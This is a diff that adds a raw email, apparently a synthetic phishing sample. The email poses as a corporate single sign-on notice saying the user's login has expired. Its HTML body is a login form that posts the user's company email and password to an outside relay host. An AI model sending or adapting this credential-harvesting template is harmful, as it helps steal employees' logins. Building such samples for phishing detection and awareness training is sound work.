@@ -1,0 +1,10 @@
+From: =?utf-8?B?57uf5LiA6Lqr5Lu96K6k6K+B?= <sso@corp-portal-gw.example>
+To: staff@corp.internal
+Date: Sun, 06 Sep 2026 09:12:00 +0800
+Message-ID: <0002-b14@synth.example>
+Subject: 登录态已失效，请重新认证
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+
+<html><body style='background:#f5f6f7'><div style='max-width:380px;margin:40px auto;background:#fff;border:1px solid #ddd;border-radius:8px;padding:24px;font-family:sans-serif'><h3 style='margin-top:0'>企业统一认证</h3><form action='https://sso-relay-example.example.co/session'><input name='u' placeholder='企业邮箱' style='width:100%;padding:10px;margin:6px 0;border:1px solid #ccc'><input type='password' name='p' placeholder='密码' style='width:100%;padding:10px;margin:6px 0;border:1px solid #ccc'><button style='width:100%;padding:10px;background:#2f6fed;color:#fff;border:0'>登 录</button></form><p style='font-size:12px;color:#999'>忘记密码？联系管理员</p></div></body></html>
